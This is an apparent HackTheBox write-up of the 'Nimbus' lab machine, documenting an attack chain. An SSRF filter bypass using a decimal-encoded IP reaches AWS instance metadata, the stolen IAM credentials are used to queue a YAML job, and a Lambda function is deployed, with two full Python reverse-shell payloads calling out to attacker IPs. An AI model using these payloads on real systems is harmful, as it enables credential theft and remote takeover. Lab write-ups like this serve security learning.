# Nimbus — HackTheBox Writeup

**Platform:** HackTheBox  
**Difficulty:** Hard  
**OS:** Linux  
**IP:** `$TARGET`  
**Domain:** `nimbus.htb`, `aws.nimbus.htb`  
**Tech Stack:** nginx, LocalStack (AWS emulation), SQS, Lambda (Python), S3

> **Status:** Foothold obtained as `worker` in a Python job-runner container; host/root escalation path still in progress.

---

## Attack Chain Overview

```
URL fetch feature → SSRF (decimal-encoded IP + query string bypass)
   → AWS IMDS via http://2852039166/latest/meta-data/
   → IAM temporary credentials (nimbus-web-role)
   → AWS CLI → SQS queue discovery
   → Send YAML job with Python reverse shell → worker container shell
   → Container environment → new AWS credentials
   → S3 write access → Lambda function creation (reverse shell)
   → Root in Lambda container
   → Host escalation: TBD
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Fuzzing](#2-web-fuzzing)
3. [SSRF via URL Fetch — AWS Metadata](#3-ssrf-via-url-fetch--aws-metadata)
4. [AWS Credential Extraction and SQS Discovery](#4-aws-credential-extraction-and-sqs-discovery)
5. [Reverse Shell via SQS YAML Job](#5-reverse-shell-via-sqs-yaml-job)
6. [Container Enumeration](#6-container-enumeration)
7. [Internal AWS Enumeration](#7-internal-aws-enumeration)
8. [Lambda Escape — Root in Lambda Container](#8-lambda-escape--root-in-lambda-container)
9. [Key Takeaways](#9-key-takeaways)

---

## 1. Reconnaissance

```bash
nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent
nmap -sVC -p22,80 -oN service
```

**Output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
```

Add vhost:

```bash
echo "$TARGET nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts
```

Related notes: [silent-scan](../../../tools/recon/silent-scan.md), [nmap](../../../tools/recon/nmap.md)

---

## 2. Web Fuzzing

```bash
feroxbuster -u http://nimbus.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

**Output:**
```
200  GET  http://nimbus.htb/login
200  GET  http://nimbus.htb/jobs
200  GET  http://nimbus.htb/api/v1/health
200  GET  http://nimbus.htb/
405  GET  http://nimbus.htb/jobs/preview
```

Key findings:
- `/jobs` — accepts unauthenticated job submissions during the migration window (noted in a banner on the login page).
- `/jobs/preview` — takes a URL as input, fetches it, and returns the content. **Classic SSRF candidate.**
- Login page leaks a username: `marcus`.

Related notes: [feroxbuster](../../../tools/fuzz/feroxbuster.md)

---

## 3. SSRF via URL Fetch — AWS Metadata

The `/jobs/preview` URL fetch feature validated input by checking for a `.yaml` or `.yml` suffix. This was bypassed by:

1. Using a decimal-encoded IP address instead of dotted notation (avoids hostname allow-list checks).
2. Moving the required `.yaml` suffix into the query string.

```
http://2130706433/   =  http://127.0.0.1
http://2852039166/   =  the AWS metadata IP (169.254.169.254)
```

Confirmed the bypass works:

```bash
curl -X POST http://nimbus.htb/jobs/preview \
  -d "url=http://2852039166/latest/meta-data/?foo=.yaml" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Output:**
```
ami-id
hostname
iam/
instance-id
instance-type
local-hostname
local-ipv4
placement/
security-groups
```

The IMDS (Instance Metadata Service) was reachable. The `iam/` path indicates IAM role credentials are available.

Full technique: [aws-metadata-ssrf](../../../exploits/cloud/aws-metadata-ssrf.md)

---

## 4. AWS Credential Extraction and SQS Discovery

### Read IAM Credentials via SSRF

```bash
# List available IAM roles
curl -X POST http://nimbus.htb/jobs/preview \
  -d "url=http://2852039166/latest/meta-data/iam/security-credentials/?foo=.yaml" \
  -H "Content-Type: application/x-www-form-urlencoded"
# nimbus-web-role

# Read temporary credentials
curl -X POST http://nimbus.htb/jobs/preview \
  -d "url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?foo=.yaml" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Output:**
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "<AWS_ACCESS_KEY_ID>",
  "SecretAccessKey": "<AWS_SECRET_ACCESS_KEY>",
  "Token": "<AWS_SESSION_TOKEN>",
  "Expiration": "2026-06-21T19:38:34Z"
}
```

### Configure AWS CLI

```bash
export AWS_ACCESS_KEY_ID="<AWS_ACCESS_KEY_ID>"
export AWS_SECRET_ACCESS_KEY="<AWS_SECRET_ACCESS_KEY>"
export AWS_SESSION_TOKEN="<AWS_SESSION_TOKEN>"
export AWS_DEFAULT_REGION="us-east-1"
```

AWS uses time-based signing (SigV4) — sync the clock if needed:

```bash
sudo timedatectl set-ntp true
sudo ntpdate -u pool.ntp.org
```

### Discover SQS Queues

```bash
aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
```

**Output:**
```json
{
  "QueueUrls": [
    "http://floci:4566/847219365028/nimbus-jobs"
  ]
}
```

Related notes: [aws](../../../tools/cloud/aws.md)

Full technique: [sqs-job-yaml-rce](../../../exploits/cloud/sqs-job-yaml-rce.md)

---

## 5. Reverse Shell via SQS YAML Job

The queue processes YAML job definitions with an embedded Python `script` field. Sent a Python reverse shell as a cron-scheduled job:

```bash
nc -lvnp 4444

cat > rev.yaml << 'EOF'
name: test-revshell
schedule: "* * * * *"
runtime: python3.11
script: |
  import socket,subprocess,os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("10.10.15.26",4444))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  subprocess.call(["/bin/bash","-i"])
EOF

aws --endpoint-url http://aws.nimbus.htb sqs send-message \
    --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
    --message-body file://rev.yaml
```

Reverse shell received. Initial access as `worker` in a container.

---

## 6. Container Enumeration

```bash
cat /home/worker/user.txt

id
# uid=1000(worker) gid=1000(worker) groups=1000(worker)

hostname
# f42e760d8943

# Check capabilities to confirm container context
cat /proc/1/status | grep Cap
# CapPrm: 0000000000000000
# CapEff: 0000000000000000
# CapBnd: 00000000a80425fb
```

Zero effective capabilities — the container is not privileged. Standard container escape paths (SYS_ADMIN, device mounts) are unavailable.

### Environment Contains New AWS Credentials

```bash
env
```

**Relevant output:**
```
HOSTNAME=f42e760d8943
AWS_ENDPOINT_URL=http://aws.nimbus.htb
AWS_DEFAULT_REGION=us-east-1
AWS_ACCESS_KEY_ID=<AWS_ACCESS_KEY_ID>
AWS_SECRET_ACCESS_KEY=<AWS_SECRET_ACCESS_KEY>
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
```

The container's AWS credentials are different from the web-role credentials obtained via SSRF — these are the job-runner role credentials.

### Internal Network

```bash
cat /etc/hosts
```

```
172.18.0.1  aws.nimbus.htb
172.18.0.1  nimbus.htb
172.18.0.3  f42e760d8943
```

The LocalStack AWS endpoint is at `172.18.0.1`. Direct access from the container is possible without the external vhost.

---

## 7. Internal AWS Enumeration

With the container's credentials, enumerate what the job-runner role can do:

```bash
aws --endpoint-url http://172.18.0.2:4566 sts get-caller-identity
aws --endpoint-url http://172.18.0.2:4566 s3 ls
aws --endpoint-url http://172.18.0.2:4566 iam list-users
aws --endpoint-url http://172.18.0.2:4566 lambda list-functions
```

### S3 Write Access Confirmed

```bash
aws --endpoint-url http://172.18.0.2:4566 s3 cp /etc/hostname s3://nimbus-dev-artifacts/test.txt
aws --endpoint-url http://172.18.0.2:4566 s3 ls s3://nimbus-dev-artifacts/
```

Write access to `nimbus-dev-artifacts` bucket means we can upload and deploy Lambda function code.

---

## 8. Lambda Escape — Root in Lambda Container

Deployed a Lambda function containing a Python reverse shell. The Lambda runtime runs as root inside its container.

### Create the Lambda Payload

```bash
cat > /tmp/lambda_function.py << 'EOF'
import socket,subprocess,os

def handler(event, context):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.201",6666))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/bash","-i"])
    return {"status": "ok"}
EOF
cd /tmp && zip shell.zip lambda_function.py
```

### Create IAM Execution Role

```bash
aws --endpoint-url http://172.18.0.2:4566 iam create-role \
    --role-name lambda-exec \
    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
```

### Deploy and Invoke the Lambda Function

```bash
# Create the function
aws --endpoint-url http://172.18.0.2:4566 lambda create-function \
    --function-name escape2 \
    --runtime python3.11 \
    --role arn:aws:iam::847219365028:role/lambda-exec \
    --handler lambda_function.handler \
    --zip-file fileb:///tmp/shell.zip

# Extend the timeout so the reverse shell stays open
aws --endpoint-url http://172.18.0.2:4566 lambda update-function-configuration \
    --function-name escape2 \
    --timeout 60000

# Start listener on attacker machine
nc -lvnp 6666

# Invoke the function from within the container
aws --endpoint-url http://172.18.0.2:4566 lambda invoke \
    --function-name escape2 \
    --payload '{}' /tmp/out.json
```

**Result:**

```bash
whoami
# root
cat /etc/hostname
# f207a05b6bc9
```

Root access in the Lambda container (`f207a05b6bc9`). This is a different container from the initial `worker` foothold.

> **Status:** host escalation from the Lambda container is still in progress.

---

## 9. Key Takeaways

1. **SSRF + decimal-encoded IPs bypass naive allow-lists.** URL validators that check for `.yaml` suffixes or block `127.0.0.1` are trivially bypassed with decimal notation (`2130706433`) and query-string suffix anchoring (`?foo=.yaml`).
2. **AWS IMDS is the crown jewel of cloud SSRF.** If a URL fetcher can reach `169.254.169.254`, the IAM credentials at `/latest/meta-data/iam/security-credentials/<role>` are immediately weaponizable for AWS API access.
3. **SQS queues are an unexpected RCE surface.** A job scheduler that processes YAML from an SQS queue and executes the `script` field directly is functionally equivalent to a scheduled command injection — send your shell payload as a cron job.
4. **Container environment variables expose internal secrets.** Lambda and job-runner containers routinely carry AWS credentials, queue URLs, and DB passwords in environment variables. `env` is always one of the first commands to run after landing in a container.
5. **LocalStack AWS services are often under-permissioned relative to real AWS.** IAM and resource policies may be misconfigured or absent entirely in test environments — always enumerate available service actions even if they seem restricted.

---

## Related Notes

- [aws-metadata-ssrf](../../../exploits/cloud/aws-metadata-ssrf.md)
- [sqs-job-yaml-rce](../../../exploits/cloud/sqs-job-yaml-rce.md)
- [aws](../../../tools/cloud/aws.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [nmap](../../../tools/recon/nmap.md)
- [silent-scan](../../../tools/recon/silent-scan.md)
